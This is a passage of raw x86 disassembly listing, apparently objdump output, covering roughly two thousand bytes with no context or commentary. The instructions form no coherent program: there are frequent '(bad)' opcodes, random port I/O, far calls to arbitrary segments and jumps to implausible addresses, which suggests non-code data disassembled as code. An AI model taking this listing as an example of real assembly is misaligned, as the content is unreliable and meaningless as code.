  427e3a:	mov    ebx,0xe4142072
  427e3f:	xchg   esi,eax
  427e40:	xor    DWORD PTR ds:0xb32f5eee,ecx
  427e46:	cmp    cl,bh
  427e48:	add    ah,dl
  427e4a:	lock mov al,ds:0x37ec3c0d
  427e50:	adc    DWORD PTR [esi-0x7da1e29c],esp
  427e56:	xlat   BYTE PTR ds:[ebx]
  427e57:	or     DWORD PTR [esi+esi*4],edi
  427e5a:	mov    edi,0x460b442
  427e5f:	add    BYTE PTR [edx+0x2a],bh
  427e62:	xchg   esi,eax
  427e63:	add    al,0x20
  427e65:	dec    ecx
  427e66:	in     al,dx
  427e67:	lahf   
  427e68:	jb     0x427e2d
  427e6a:	rcl    DWORD PTR ds:0xcea2de1e,1
  427e70:	xor    esp,ecx
  427e72:	mov    bl,0x40
  427e74:	in     eax,0x60
  427e76:	cmp    eax,0xad8608ac
  427e7b:	sub    eax,0x3ceee361
  427e80:	nop
  427e81:	out    dx,al
  427e82:	cmp    al,ah
  427e84:	push   edi
  427e85:	pop    ebp
  427e86:	repz mov al,ds:0xd19e6027
  427e8c:	test   BYTE PTR [edx-0x68a218f8],al
  427e92:	add    DWORD PTR [eax+0x4a87e72f],ebx
  427e98:	sahf   
  427e99:	jbe    0x427e9f
  427e9b:	mov    al,0x77
  427e9d:	push   edi
  427e9e:	outs   dx,BYTE PTR ds:[esi]
  427e9f:	fdiv   DWORD PTR [ecx]
  427ea1:	inc    ebp
  427ea2:	mov    eax,ds:0xee751935
  427ea7:	pop    edi
  427ea8:	or     eax,0x80bb6c43
  427ead:	repnz mov al,fs:0x3fa36b30
  427eb4:	sahf   
  427eb5:	jne    0x427f17
  427eb7:	add    BYTE PTR [ebx+0x17],bl
  427eba:	or     BYTE PTR [ebx],bh
  427ebc:	cmp    BYTE PTR [eax+0x6e],al
  427ebf:	es aas 
  427ec1:	add    al,0x54
  427ec3:	test   al,0xba
  427ec5:	inc    eax
  427ec6:	adc    ah,BYTE PTR [ebp+0x346f5976]
  427ecc:	dec    edx
  427ecd:	hlt    
  427ece:	mov    gs,WORD PTR [ebp+eiz*4+0x2f6feec5]
  427ed5:	ret    
  427ed6:	cwde   
  427ed7:	inc    esi
  427ed8:	add    edx,DWORD PTR [edi+esi*1]
  427edb:	adc    DWORD PTR [ebx-0x6e32fba0],esi
  427ee1:	pop    es
  427ee2:	xchg   esp,eax
  427ee3:	dec    eax
  427ee4:	scas   al,BYTE PTR es:[edi]
  427ee5:	add    ch,bl
  427ee7:	push   ebx
  427ee8:	pop    esi
  427ee9:	cmp    edx,DWORD PTR [ecx+0x409b5b4b]
  427eef:	inc    edx
  427ef0:	lahf   
  427ef1:	adc    al,bh
  427ef3:	ins    BYTE PTR es:[edi],dx
  427ef4:	in     al,0x49
  427ef6:	push   0x2660ccf8
  427efb:	mov    dl,0x78
  427efd:	pop    ss
  427efe:	push   edx
  427eff:	mov    ds,WORD PTR [esi-0x68]
  427f02:	jmp    0x125d64c1
  427f07:	pop    esi
  427f08:	shl    DWORD PTR [ecx-0x3],0x3a
  427f0c:	(bad)  
  427f0e:	(bad)  
  427f0f:	leave  
  427f10:	pushf  
  427f11:	xchg   ecx,eax
  427f12:	xchg   ebx,eax
  427f13:	outs   dx,DWORD PTR ds:[esi]
  427f14:	pop    esi
  427f15:	jecxz  0x427eda
  427f17:	cld    
  427f18:	xor    edi,esp
  427f1a:	sub    ebp,ebx
  427f1c:	(bad)  [edi+0x4291835a]
  427f22:	mov    BYTE PTR [ecx-0x71f11ed3],ch
  427f28:	dec    edx
  427f29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f2a:	(bad)  
  427f2b:	push   cs
  427f2c:	addr16 inc ebx
  427f2e:	imul   edx,DWORD PTR [eax],0x36c611c
  427f34:	lea    ebx,[edi-0x46]
  427f37:	mov    eax,ds:0xc7c9f3b5
  427f3c:	adc    ah,BYTE PTR [eax]
  427f3e:	fcomp  QWORD PTR [edi+eiz*2-0x3a]
  427f42:	out    dx,al
  427f43:	js     0x427fa8
  427f45:	push   ebx
  427f46:	and    BYTE PTR [ecx-0x5f0bc318],bl
  427f4c:	push   esi
  427f4d:	or     ecx,edx
  427f4f:	scas   eax,DWORD PTR es:[edi]
  427f50:	adc    al,0xd2
  427f52:	jmp    0x427f3e
  427f54:	pop    esi
  427f55:	ror    DWORD PTR ds:0x146c9573,1
  427f5b:	pop    ecx
  427f5c:	test   al,0x60
  427f5e:	mov    ds:0x62dd9b82,eax
  427f63:	inc    ebp
  427f64:	add    ebx,ebx
  427f66:	out    dx,al
  427f67:	mov    esp,0xbe693323
  427f6c:	push   es
  427f6d:	test   edi,eax
  427f6f:	mov    al,ds:0x5629cd59
  427f74:	adc    eax,0x5f27a031
  427f79:	xchg   esp,eax
  427f7a:	sub    cl,cl
  427f7c:	stc    
  427f7d:	xchg   BYTE PTR ds:[ecx],ah
  427f80:	fs stc 
  427f82:	xchg   ebx,eax
  427f83:	xor    DWORD PTR [ebp+0x5d],esi
  427f86:	xchg   bx,ax
  427f88:	test   BYTE PTR ds:0x8b8e7356,bl
  427f8e:	pop    es
  427f8f:	mov    edx,0x24cae45e
  427f94:	jnp    0x427f69
  427f96:	cmp    eax,0xf4d1173a
  427f9b:	ins    BYTE PTR es:[edi],dx
  427f9c:	lods   eax,DWORD PTR ds:[esi]
  427f9d:	pop    ecx
  427f9e:	aam    0x46
  427fa0:	add    BYTE PTR [ebx-0x5e],cl
  427fa3:	xchg   ebp,eax
  427fa4:	push   ds
  427fa5:	loope  0x427f5b
  427fa7:	pop    ebx
  427fa8:	fist   WORD PTR ds:0xe0828f26
  427fae:	arpl   WORD PTR [edi-0x571423da],di
  427fb4:	dec    eax
  427fb5:	popa   
  427fb6:	int3   
  427fb7:	mov    dl,al
  427fb9:	out    dx,eax
  427fba:	loop   0x427f42
  427fbc:	aas    
  427fbd:	aam    0x10
  427fbf:	retf   
  427fc0:	jne    0x427f76
  427fc2:	out    dx,al
  427fc3:	or     DWORD PTR [edx-0x9],esp
  427fc6:	xlat   BYTE PTR ds:[ebx]
  427fc7:	int    0xf5
  427fc9:	pusha  
  427fca:	add    eax,0x84740b41
  427fcf:	stos   BYTE PTR es:[edi],al
  427fd0:	mov    al,0x88
  427fd2:	out    dx,al
  427fd3:	add    ah,BYTE PTR [ebp+0xc]
  427fd6:	ror    DWORD PTR [ebp-0x74],1
  427fd9:	lods   al,BYTE PTR ds:[esi]
  427fda:	and    BYTE PTR [ecx-0x67c09ac5],0x5f
  427fe1:	pop    edx
  427fe2:	dec    ebx
  427fe3:	pop    edi
  427fe4:	pop    ebp
  427fe5:	sub    eax,0x9f77fbf8
  427fea:	xchg   esi,eax
  427feb:	outs   dx,DWORD PTR ds:[esi]
  427fec:	call   0x7795:0x51bcfdc6
  427ff3:	mov    eax,ds:0x191a1ec7
  427ff8:	and    DWORD PTR [edx],0xffffffee
  427ffb:	in     al,dx
  427ffc:	pop    ebp
  427ffd:	out    0xf4,eax
  427fff:	or     BYTE PTR [ebx+0x6ba0ba4e],dl
  428005:	in     eax,dx
  428006:	stos   BYTE PTR es:[edi],al
  428007:	test   al,0xbc
  428009:	push   es
  42800a:	sar    edx,cl
  42800c:	arpl   WORD PTR [edi+0x60cbf5a0],si
  428012:	or     BYTE PTR gs:[ebx+0x5b],dh
  428016:	inc    eax
  428017:	mov    eax,ds:0x37e60104
  42801c:	sub    eax,0x5e4346d6
  428021:	fimul  DWORD PTR [edi-0x4c]
  428024:	std    
  428025:	jb     0x428003
  428027:	(bad)  
  428028:	hlt    
  428029:	pusha  
  42802a:	and    DWORD PTR [edx],0xffffffa0
  42802d:	test   eax,0x1c0d773e
  428032:	out    dx,al
  428033:	or     al,0xb4
  428035:	aaa    
  428036:	test   DWORD PTR [edx-0x5e9bc63a],eax
  42803c:	ja     0x428079
  42803e:	pop    edi
  42803f:	call   0x265e:0xaa6dbf42
  428046:	push   ss
  428047:	sub    al,0xf
  428049:	mov    ah,0x23
  42804b:	adc    ah,ah
  42804d:	popa   
  42804e:	loop   0x427fd7
  428050:	xor    eax,DWORD PTR [esi+ebp*8+0x1d45947]
  428057:	fdiv   QWORD PTR [ecx-0x7a]
  42805a:	out    0xce,eax
  42805c:	mov    dl,0xa7
  42805e:	jge    0x428019
  428060:	cs jno 0x42800e
  428063:	push   ebx
  428064:	mov    WORD PTR [eax+0x57],fs
  428067:	stos   DWORD PTR es:[edi],eax
  428068:	mov    DWORD PTR [ebp+0x2f],esi
  42806b:	clc    
  42806c:	xchg   esi,eax
  42806d:	fwait
  42806e:	out    dx,al
  42806f:	sahf   
  428070:	sbb    ah,BYTE PTR [esi+0x2b]
  428073:	add    BYTE PTR [esi],0xfb
  428076:	call   0xfc78c01b
  42807b:	dec    esi
  42807c:	rol    dl,0x60
  42807f:	xor    BYTE PTR [esi-0x6a],bl
  428082:	ror    bl,cl
  428084:	fidiv  WORD PTR [ebx]
  428086:	mov    eax,0x48a6ab83
  42808b:	test   al,0xbb
  42808d:	in     al,0x79
  42808f:	pop    ebx
  428090:	dec    ebx
  428091:	loope  0x4280af
  428093:	inc    ebx
  428094:	and    BYTE PTR [esi+ebp*8],ah
  428097:	ror    bl,cl
  428099:	(bad)  
  42809b:	into   
  42809c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42809d:	jnp    0x4280fa
  42809f:	mov    eax,ds:0x502ea4ee
  4280a4:	nop
  4280a5:	fdivr  QWORD PTR [eax+0x794d5ec9]
  4280ab:	stos   DWORD PTR es:[edi],eax
  4280ac:	scas   eax,DWORD PTR es:[edi]
  4280ad:	hlt    
  4280ae:	inc    ebx
  4280af:	imul   edi,DWORD PTR [ebx+0x60],0xffffffad
  4280b3:	push   0x92e55801
  4280b8:	cmp    bl,ah
  4280ba:	out    dx,al
  4280bb:	test   DWORD PTR [ecx-0x7e],esp
  4280be:	inc    edx
  4280bf:	jecxz  0x428068
  4280c1:	dec    edx
  4280c2:	(bad)  [edi+0x3e04c8b1]
  4280c8:	frstor [eax+0x76aa365d]
  4280ce:	out    dx,al
  4280cf:	test   ah,cl
  4280d1:	es ds fcomip st,st(4)
  4280d5:	lods   al,BYTE PTR ds:[esi]
  4280d6:	jl     0x428065
  4280d8:	push   ecx
  4280d9:	arpl   WORD PTR ds:0xc382fe21,sp
  4280df:	out    0xb6,eax
  4280e1:	push   ecx
  4280e2:	in     eax,dx
  4280e3:	inc    esi
  4280e4:	xor    ch,BYTE PTR [esi-0x2777e2a3]
  4280ea:	ds sahf 
  4280ec:	push   ds
  4280ed:	inc    ebx
  4280ee:	call   0x4d232730
  4280f3:	imul   esi,DWORD PTR [edx+0x4b],0x23
  4280f7:	push   eax
  4280f8:	pop    esi
  4280f9:	sbb    eax,0x10f61035
  4280fe:	mov    bl,0x80
  428100:	mov    bh,0x59
  428102:	test   BYTE PTR [ebp+0x10dcc8bd],bl
  428108:	push   0x5ee810e1
  42810d:	xchg   esi,eax
  42810e:	(bad)  
  428110:	or     BYTE PTR [esi-0x53],ch
  428113:	xor    BYTE PTR [esi+eiz*4+0x745c99bc],bh
  42811a:	ficomp DWORD PTR [edx]
  42811c:	fsubp  st(3),st
  42811e:	mov    edi,0xee3b5560
  428123:	arpl   WORD PTR [ecx+0x3e4f53d0],dx
  428129:	out    0xfc,eax
  42812b:	mov    al,ds:0xe309c1bd
  428130:	jmp    0x7d26ad8a
  428135:	(bad)  
  428136:	out    dx,al
  428137:	cmp    al,0x30
  428139:	popf   
  42813a:	div    DWORD PTR [edi-0x5f17a41f]
  428140:	jg     0x428132
  428142:	mov    al,0x1a
  428144:	ror    DWORD PTR [edi-0xe],1
  428147:	cmp    ebx,DWORD PTR [esi-0x56]
  42814a:	rcl    BYTE PTR [eax],cl
  42814c:	xchg   edi,eax
  42814d:	test   al,0x2b
  42814f:	repnz mov esi,0xd3bb174a
  428155:	inc    esp
  428156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428157:	and    DWORD PTR [ebp+0x11],esp
  42815a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42815b:	or     DWORD PTR [ebp+0x662aee3c],0xffffffe3
  428162:	aaa    
  428163:	pop    ebp
  428164:	lock add bh,BYTE PTR [ebx]
  428167:	mov    eax,ds:0x3c22b19b
  42816c:	pop    ebx
  42816d:	ficom  DWORD PTR [esp+ebp*1-0x7bdf68a2]
  428174:	xchg   ebx,eax
  428175:	xlat   BYTE PTR ds:[ebx]
  428176:	or     al,bl
  428178:	loopne 0x4281da
  42817a:	add    BYTE PTR [edi],cl
  42817c:	mov    al,ds:0xeb05c0ae
  428181:	pop    eax
  428182:	out    dx,al
  428183:	in     eax,0xe4
  428185:	and    DWORD PTR [eax-0x33],edi
  428188:	xor    DWORD PTR [ecx],0xd1f7a196
  42818e:	sbb    DWORD PTR [esi+0x44],esp
  428191:	in     al,0xf8
  428193:	mul    BYTE PTR [esi+esi*4+0x6]
  428197:	or     al,0x8b
  428199:	mov    esi,0x4157c0ae
  42819e:	das    
  42819f:	sbb    DWORD PTR ds:0xb4ef7061,0xf600a677
  4281a9:	push   eax
  4281aa:	out    dx,al
  4281ab:	push   ss
  4281ac:	pusha  
  4281ad:	pop    es
  4281ae:	inc    ecx
  4281af:	frstor fs:[edx-0x6b]
  4281b3:	lock out 0x60,eax
  4281b6:	cs call 0xcabe:0xa7307b56
  4281be:	and    esi,ebp
  4281c0:	imul   esp,eax,0xfffffff9
  4281c3:	inc    edi
  4281c4:	sbb    eax,0xeb31dfe9
  4281c9:	pusha  
  4281ca:	jb     0x428235
  4281cc:	jg     0x4281e4
  4281ce:	ret    
  4281cf:	or     eax,0x7edbe77
  4281d4:	push   ebx
  4281d5:	jne    0x4281d0
  4281d7:	mov    WORD PTR [edi],cs
  4281d9:	fistp  DWORD PTR [esi]
  4281db:	xor    BYTE PTR [ecx+0x51],0x27
  4281df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281e0:	jmp    0x9891908f
  4281e5:	js     0x42818b
  4281e7:	jo     0x428235
  4281e9:	ss xchg ebx,eax
  4281eb:	popa   
  4281ec:	pop    esi
  4281ed:	in     eax,0x3e
  4281ef:	and    bh,BYTE PTR [ecx+0x7ca8552b]
  4281f5:	jae    0x42822a
  4281f7:	fst    DWORD PTR [esi+0x3ef0b160]
  4281fd:	gs out dx,al
  4281ff:	(bad)
  428202:	pop    edi
  428203:	fcomp  DWORD PTR [eax]
  428205:	clc    
  428206:	das    
  428207:	mov    eax,ds:0x52806594
  42820c:	jb     0x4281d5
  42820e:	sub    edx,edi
  428210:	arpl   WORD PTR [ebx],bx
  428212:	sbb    cl,0xc8
  428215:	add    BYTE PTR [edi],al
  428217:	loopne 0x4281e4
  428219:	sub    eax,0xf9748fac
  42821e:	adc    ah,BYTE PTR [ecx-0x629b5489]
  428224:	test   eax,0xe2b0ecce
  428229:	dec    edi
  42822a:	mov    WORD PTR [ebx+0x6],?
  42822d:	mov    eax,ds:0x60fb3358
  428232:	mov    edx,0x94560406
  428237:	or     edx,DWORD PTR [edx]
  428239:	imul   ebp,esi,0x564f6636
  42823f:	std    
  428240:	and    ch,ch
  428242:	aaa    
  428243:	mov    ss,WORD PTR [ebp-0xe]
  428246:	mov    BYTE PTR [edx-0x119730c6],ah
  42824c:	and    eax,DWORD PTR [ecx-0x69]
  42824f:	pushf  
  428250:	pop    ebp
  428251:	and    eax,0xd2218784
  428256:	pop    DWORD PTR [ebp-0x68618f5e]
  42825c:	xor    bl,cl
  42825e:	call   0xb553:0x8ece5e2b
  428265:	pop    ss
  428266:	nop
  428267:	mov    eax,ds:0x9a8a4d5f
  42826c:	add    DWORD PTR [edx-0x4],edx
  42826f:	jns    0x4282a8
  428271:	inc    ebp
  428272:	sbb    al,0x21
  428274:	retf   0x39be
  428277:	outs   dx,DWORD PTR ds:[esi]
  428278:	(bad)  
  428279:	fnstsw WORD PTR [ebx+0xd788fa0]
  42827f:	pop    ds
  428280:	call   0x5ea1a1d4
  428285:	push   es
  428286:	dec    edi
  428287:	xor    eax,0x42cfd7b5
  42828c:	cwde   
  42828d:	pop    edi
  42828e:	dec    ebp
  42828f:	cmp    eax,0x78b40ed3
  428294:	xor    BYTE PTR [ecx+0x8a8e28b],0xae
  42829b:	out    dx,eax
  42829c:	aaa    
  42829d:	mov    bl,0xee
  42829f:	into   
  4282a0:	xor    al,0x9b
  4282a2:	pushf  
  4282a3:	fisub  WORD PTR [edi]
  4282a5:	enter  0xf160,0x60
  4282a9:	popa   
  4282aa:	and    DWORD PTR [ebp-0x1e],eax
  4282ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4282ae:	dec    edx
  4282af:	loope  0x42827b
  4282b1:	or     ch,ch
  4282b3:	retf   
  4282b4:	gs jecxz 0x42824b
  4282b7:	pop    es
  4282b8:	inc    ecx
  4282b9:	add    DWORD PTR [ebx],edi
  4282bb:	ss add al,0x61
  4282be:	jne    0x428279
  4282c0:	ret    0x85d1
  4282c3:	pop    esi
  4282c4:	or     BYTE PTR [ecx-0x11],ch
  4282c7:	push   esp
  4282c8:	cwde   
  4282c9:	push   0x5d
  4282cb:	add    ebp,ebx
  4282cd:	stos   BYTE PTR es:[edi],al
  4282ce:	int3   
  4282cf:	imul   esi,DWORD PTR [ebx],0x57485c57
  4282d5:	mov    ds:0xf23da190,al
  4282da:	imul   eax,DWORD PTR es:[esi+edi*8],0xffffffff
  4282df:	sbb    DWORD PTR [ecx+0x4a],esi
  4282e2:	scas   al,BYTE PTR es:[edi]
  4282e3:	js     0x42831f
  4282e5:	enter  0x8ea7,0x9e
  4282e9:	pop    ebp
  4282ea:	dec    ecx
  4282eb:	push   esi
  4282ec:	dec    ebp
  4282ed:	shr    DWORD PTR [edx-0x67],1
  4282f0:	xchg   BYTE PTR [edi+0xc5e3974],ch
  4282f6:	(bad)  
  4282f7:	sti    
  4282f8:	and    al,0x8e
  4282fa:	sbb    esp,DWORD PTR [edx+0x76]
  4282fd:	popa   
  4282fe:	imul   esi,DWORD PTR [esi+ebx*8+0x23],0xffffffea
  428303:	push   es
  428304:	cmp    al,0xc2
  428306:	mov    ah,bl
  428308:	pop    esi
  428309:	cli    
  42830a:	in     eax,0xe6
  42830c:	dec    ebp
  42830d:	dec    eax
  42830e:	fadd   DWORD PTR [ebp+0x7b]
  428311:	pusha  
  428312:	cmovnp edx,DWORD PTR [edi]
  428315:	jle    0x428330
  428317:	fisub  DWORD PTR [edi]
  428319:	test   BYTE PTR [eax],dl
  42831b:	bound  ebx,QWORD PTR [ebp+0x73]
  42831e:	pop    ds
  42831f:	mov    eax,ds:0xd08593c6
  428324:	add    eax,ebp
  428326:	sub    al,0xec
  428328:	shl    DWORD PTR [eax-0x34],cl
  42832b:	adc    ch,bh
  42832d:	and    DWORD PTR [esi-0x65],0xffffff8d
  428331:	cmc    
  428332:	and    BYTE PTR [esi+0xaee2a9a],bl
  428338:	aad    0x6b
  42833a:	addr16 jp 0x428378
  42833d:	jb     0x4283a2
  42833f:	mov    eax,ds:0xb4567c14
  428344:	jnp    0x42832a
  428346:	add    esi,esp
  428348:	pop    esi
  428349:	and    BYTE PTR [esi+0x11],cl
  42834c:	jns    0x428366
  42834e:	std    
  42834f:	sbb    dl,BYTE PTR [edi+0x4122f160]
  428355:	sbb    ch,BYTE PTR [ebx-0x110b669a]
  42835b:	inc    ebp
  42835c:	lahf   
  42835d:	xor    cl,cl
  42835f:	push   esp
  428360:	cmp    eax,0x63a2976c
  428365:	(bad)  
  428366:	push   edi
  428367:	stc    
  428368:	or     ebx,DWORD PTR [ebx+0x30]
  42836b:	mov    cl,0xb6
  42836d:	test   al,0xee
  42836f:	adc    ah,BYTE PTR [edi]
  428371:	fcomp  DWORD PTR [eax]
  428373:	into   
  428374:	add    BYTE PTR [eax-0x58],ch
  428377:	mov    al,ds:0xf8907ddf
  42837c:	stos   BYTE PTR es:[edi],al
  42837d:	icebp  
  42837e:	cmp    DWORD PTR [esi+0x3bbe3a5e],0xc8681260
  428388:	dec    esi
  428389:	popa   
  42838a:	aaa    
  42838b:	mov    al,0xd7
  42838d:	(bad)  
  42838e:	int    0xa1
  428390:	int3   
  428391:	mov    esi,0xad5c41ee
  428396:	call   0x89aa:0x3ffe6737
  42839d:	xchg   ebp,eax
  42839e:	mov    ch,BYTE PTR [eax+0xeaa5a0e]
  4283a4:	xlat   BYTE PTR ds:[ebx]
  4283a5:	pusha  
  4283a6:	mov    edi,0xeb698238
  4283ab:	cmp    eax,esp
  4283ad:	adc    al,BYTE PTR [esi]
  4283af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283b0:	mov    ecx,0xd636b1a8
  4283b5:	pop    esi
  4283b6:	outs   dx,BYTE PTR ds:[esi]
  4283b7:	retf   
  4283b8:	add    DWORD PTR [edx-0x5561f958],edx
  4283be:	lods   al,BYTE PTR ds:[esi]
  4283bf:	call   0x1d91:0xaaaec45d
  4283c6:	mov    ds:0xcd9672da,al
  4283cb:	mov    al,ds:0xf1e7591d
  4283d0:	fwait
  4283d1:	sub    ebx,DWORD PTR [esp+esi*2]
  4283d4:	fs inc edx
  4283d6:	jle    0x428417
  4283d8:	inc    edi
  4283d9:	adc    edi,0xaa7edbec
  4283df:	mov    al,ds:0x5f8209b6
  4283e4:	sbb    DWORD PTR [ebx+0x5f5e0f07],ebx
  4283ea:	fld    TBYTE PTR [edi+0x6584b5d5]
  4283f0:	pop    esp
  4283f1:	popa   
  4283f2:	fwait
  4283f3:	mov    ebx,0x77c90aac
  4283f8:	mov    ds:0xd1181657,al
  4283fd:	and    ebp,0x97f05ee7
  428403:	rol    dh,0x8c
  428406:	clc    
  428407:	mov    ebp,0xf56c43a3
  42840c:	test   DWORD PTR [eax],esp
  42840e:	push   0x89878f59
  428413:	les    eax,FWORD PTR [eax-0x3659149f]
  428419:	mov    BYTE PTR [ebp+0x6c],bh
  42841c:	cmp    dh,ah
  42841e:	arpl   WORD PTR [ecx-0xd25b382],sp
  428424:	shl    edi,0xee
  428427:	add    eax,0x9c03cb46
  42842c:	mov    al,0xad
  42842e:	xchg   DWORD PTR [ecx+0x1135f48],esp
  428434:	jmp    DWORD PTR [esi+0xa5e382a]
  42843a:	sahf   
  42843b:	jp     0x428474
  42843d:	test   eax,0x61395905
  428442:	pop    esp
  428443:	sahf   
  428444:	aas    
  428445:	inc    esp
  428446:	(bad)  
  428447:	sti    
  428448:	mov    esi,0xbf3e01c2
  42844d:	cmp    al,0xa3
  42844f:	and    ebp,ebx
  428451:	and    al,0x22
  428453:	stos   BYTE PTR es:[edi],al
  428454:	mov    ds:0x6a9f5cda,eax
  428459:	pushf  
  42845a:	dec    ebx
  42845b:	or     DWORD PTR [esi],ebx
  42845d:	jecxz  0x428411
  42845f:	ins    DWORD PTR es:[edi],dx
  428460:	lea    eax,[ebx+0x23]
  428463:	adc    al,0xac
  428465:	pusha  
  428466:	mov    cl,0xe5
  428469:	or     ah,ah
  42846b:	shr    DWORD PTR [esi+0x70162760],cl
  428471:	daa    
  428472:	loopne 0x4284c6
  428474:	inc    ebx
  428475:	stos   BYTE PTR es:[edi],al
  428476:	inc    edi
  428477:	mov    cl,0x51
  428479:	mov    al,0xee
  42847b:	cmp    eax,0x24c1f68c
  428480:	scas   eax,DWORD PTR es:[edi]
  428481:	out    0x13,eax
  428483:	mov    eax,ds:0x3670b6
  428488:	nop
  428489:	dec    esp
  42848a:	arpl   bx,sp
  42848c:	into   
  42848d:	and    ch,dh
  42848f:	sbb    WORD PTR [eax-0x3cf07aa],di
  428496:	jle    0x428439
  428498:	sbb    al,0x15
  42849a:	or     ebp,DWORD PTR [edx+0x5d]
  42849d:	shr    BYTE PTR [ebp-0xa13a1d5],1
  4284a3:	add    eax,0xe55aff
  4284a8:	jge    0x42850a
  4284aa:	pop    eax
  4284ab:	je     0x42849a
  4284ad:	add    al,0xc8
  4284af:	lods   eax,DWORD PTR ds:[esi]
  4284b0:	dec    ecx
  4284b1:	loop   0x42848b
  4284b3:	aaa    
  4284b4:	pop    esi
  4284b5:	jmp    0x428474
  4284b7:	call   0x491a:0xbd99959b
  4284be:	popf   
  4284bf:	inc    esp
  4284c0:	dec    edi
  4284c1:	sbb    eax,0x3538c4db
  4284c6:	frstor [eax+0x21146455]
  4284cc:	push   ecx
  4284cd:	xor    al,0xc8
  4284cf:	mov    al,ds:0x54bcf0f1
  4284d4:	mov    ch,0x2a
  4284d6:	push   edi
  4284d7:	fisub  DWORD PTR [ebx+0x11]
  4284da:	and    ah,0xc1
  4284dd:	and    ebp,DWORD PTR [esi-0x40503a91]
  4284e3:	pop    es
  4284e4:	inc    ebp
  4284e5:	inc    ebp
  4284e6:	hlt    
  4284e7:	mov    eax,0x20d7028a
  4284ec:	xchg   edx,eax
  4284ed:	scas   al,BYTE PTR es:[edi]
  4284ee:	(bad)  
  4284ef:	cmp    bh,BYTE PTR [ecx]
  4284f1:	pop    ebp
  4284f2:	add    dh,BYTE PTR [edx]
  4284f4:	dec    edx
  4284f5:	jno    0x4284a5
  4284f7:	inc    ecx
  4284f8:	int    0xb3
  4284fa:	loopne 0x428497
  4284fc:	sub    esp,DWORD PTR [ecx+0x21]
  4284ff:	adc    eax,0xe67e544b
  428504:	and    al,0xeb
  428506:	out    dx,al
  428507:	inc    eax
  428508:	scas   eax,DWORD PTR es:[edi]
  428509:	lods   al,BYTE PTR ds:[esi]
  42850a:	stos   DWORD PTR es:[edi],eax
  42850b:	stc    
  42850c:	jno    0x42856a
  42850e:	xor    DWORD PTR [eax-0x3b3971f4],ebp
  428514:	arpl   dx,ax
  428516:	outs   dx,BYTE PTR ds:[esi]
  428517:	and    al,0x8e
  428519:	call   0xa572:0x625e4775
  428520:	ins    BYTE PTR es:[edi],dx
  428521:	pop    ds
  428522:	mov    ecx,ss
  428524:	cmp    eax,0x1acb9060
  428529:	mov    fs,WORD PTR [eax+eax*2]
  42852c:	outs   dx,BYTE PTR ds:[esi]
  42852d:	das    
  42852e:	(bad)  
  42852f:	test   ch,bh
  428531:	dec    ebp
  428532:	in     eax,dx
  428533:	fwait
  428534:	popf   
  428535:	push   edx
  428536:	test   eax,0x4691a8e8
  42853b:	ins    BYTE PTR es:[edi],dx
  42853c:	test   DWORD PTR [esi-0x4f],0xdf612c1a
  428543:	in     al,0x2e
  428545:	pop    edi
  428546:	mov    edx,0xde685e98
  42854b:	add    al,0xe2
  42854d:	xchg   edi,eax
  42854e:	xchg   BYTE PTR [ebp-0x1669bb2],ah
  428554:	pop    esi
  428555:	sti    
  428556:	pop    esi
  428557:	push   eax
  428558:	ror    BYTE PTR [ebx],0x6d
  42855b:	pop    edi
  42855c:	inc    ebx
  42855d:	es mov esp,0xe7608248
  428563:	int3   
  428564:	xor    ecx,ecx
  428566:	(bad)  [ebx]
  428568:	inc    edi
  428569:	stos   BYTE PTR es:[edi],al
  42856a:	out    dx,al
  42856b:	icebp  
  42856c:	sbb    eax,DWORD PTR [ebx-0x4b67634f]
  428572:	loopne 0x428514
  428574:	pop    edi
  428575:	pop    edx
  428576:	sbb    eax,DWORD PTR [ebx+eiz*1+0x46]
  42857a:	sub    al,0xc2
  42857c:	pop    esi
  42857d:	dec    edi
  42857e:	push   ds
  42857f:	jnp    0x428561
  428581:	mov    ebx,0x611d8ea6
  428586:	jb     0x4285c4
  428588:	lock jp 0x42855b
  42858b:	fstp   DWORD PTR [esi+ebx*1-0x61903d11]
  428592:	push   es
  428593:	mov    BYTE PTR [eax-0x2f],bl
  428596:	cmp    eax,0x3ed62fd9
  42859b:	inc    edx
  42859c:	dec    ebp
  42859d:	popa   
  42859e:	mov    ah,0xd
  4285a0:	pop    ebx
  4285a1:	test   eax,0xbb13f8ae
  4285a6:	out    dx,al
  4285a7:	jge    0x428585
  4285a9:	and    al,0xd9
  4285ab:	cmp    dh,BYTE PTR [eax-0x485f583a]
  4285b1:	xchg   edi,eax
  4285b2:	aas    
  4285b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285b4:	push   edi
  4285b5:	xor    esp,DWORD PTR [ebx]
  4285b7:	or     BYTE PTR [esi+0x6f],bl
  4285ba:	daa    
  4285bb:	mov    esp,0x8a11e401
  4285c0:	xlat   BYTE PTR ds:[ebx]
  4285c1:	mov    edx,0x6445a175
  4285c6:	div    BYTE PTR [ebp+0x48]
  4285c9:	test   eax,0x375e666d
  4285ce:	cld    
  4285cf:	add    ebp,DWORD PTR [eax-0x5a4218d8]
  4285d5:	pusha  
  4285d6:	(bad)  
  4285d7:	cmp    bl,al
  4285d9:	call   0x7f054ceb
  4285de:	lock push ds
  4285e0:	sub    BYTE PTR [edi],al
  4285e2:	mov    eax,0x1b833940
  4285e7:	es mov esp,0x83d2065f
  4285ed:	lea    ebx,[edi+0x7]
  4285f0:	loop   0x428596
  4285f2:	std    
  4285f3:	mov    esp,0xa70aa55e
  4285f8:	mov    dh,ch
  4285fa:	sbb    eax,0x75615818
  4285ff:	inc    ebx
  428600:	fsub   QWORD PTR [edx+0x438e02b7]
  428606:	out    dx,al
  428607:	pop    eax
  428608:	pop    ebx
  428609:	inc    eax
  42860a:	sub    eax,0xf31a710e
  42860f:	sahf   
  428610:	imul   esi,DWORD PTR [edi],0x38e4d3f8
  428616:	bound  esp,QWORD PTR [ecx-0xc8b2ed5]
  42861c:	out    dx,al
  42861d:	popa   
  42861e:	lock std 
  428620:	xchg   ah,bh
  428622:	push   esp
  428623:	and    DWORD PTR [edx-0x7f301ed3],0xfe63460
  42862d:	jns    0x4286a8
  42862f:	push   0xbf0265b1
  428634:	frstor [ebx+0x2b]
  428637:	add    DWORD PTR [esi-0x1],edx
  42863a:	jp     0x4285dd
  42863c:	xor    al,0xdf
